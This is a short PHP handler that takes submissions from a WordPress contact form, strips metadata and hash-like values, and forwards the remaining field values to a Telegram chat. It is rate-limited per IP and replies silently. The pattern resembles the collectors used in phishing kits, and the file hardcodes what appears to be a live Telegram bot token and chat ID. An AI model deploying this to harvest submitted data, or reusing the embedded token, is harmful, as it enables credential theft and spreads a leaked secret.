<?php
$token = '7881037980:AAFuxBUzdY2ZWX76NC9IMIbv3nCkiXQJSs0';
$chat_id = '-4739953372';

$ip = $_SERVER['REMOTE_ADDR'];
$log_file = __DIR__ . '/ip_limit.json';
$limit = 3;

$data_log = file_exists($log_file) ? json_decode(file_get_contents($log_file), true) : [];

if (!isset($data_log[$ip])) {
    $data_log[$ip] = 1;
} else {
    $data_log[$ip]++;
}

if ($data_log[$ip] > $limit) {
    http_response_code(429); // Too many requests
    exit;
}

$data = $_POST;
$exclude_keys = ['form_name', '_wpnonce', '_wpcf7', '_wpcf7_version', '_wpcf7_locale'];
$message = "";

foreach ($data as $key => $value) {
    if (
        !in_array($key, $exclude_keys) &&
        !is_array($value) &&
        !empty(trim($value)) &&
        strlen($value) > 2 &&
        stripos($value, 'form') === false &&
        !preg_match('/^[a-f0-9]{8,}$/i', trim($value))
    ) {
        $message .= trim($value) . "\\n";
    }
}

if (!empty($message)) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);
    @file_get_contents($url);
}

file_put_contents($log_file, json_encode($data_log));
http_response_code(204);
exit;
?>
